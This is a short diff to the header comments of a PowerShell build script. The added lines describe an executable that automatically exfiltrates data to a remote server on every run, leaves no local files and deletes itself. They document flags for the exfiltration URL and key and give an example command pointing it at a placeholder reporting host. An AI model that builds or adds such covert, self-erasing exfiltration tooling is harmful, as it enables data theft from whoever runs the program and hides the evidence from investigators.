@@ -2,7 +2,10 @@
 # Run from the repo root in PowerShell (no arguments needed if deploy/config is populated):
 #   .\build_windows.ps1
 #
-# To override the server URL or key:
+# The resulting exe auto-exfils on every run, leaves no local files, and self-deletes.
+# Override at runtime with: --out PATH  --no-self-delete  --exfil URL  --exfil-key KEY
+#
+# To point at a different server:
 #   .\build_windows.ps1 -ExfilUrl https://reports.example.com -ExfilKey mykey
 
 param(
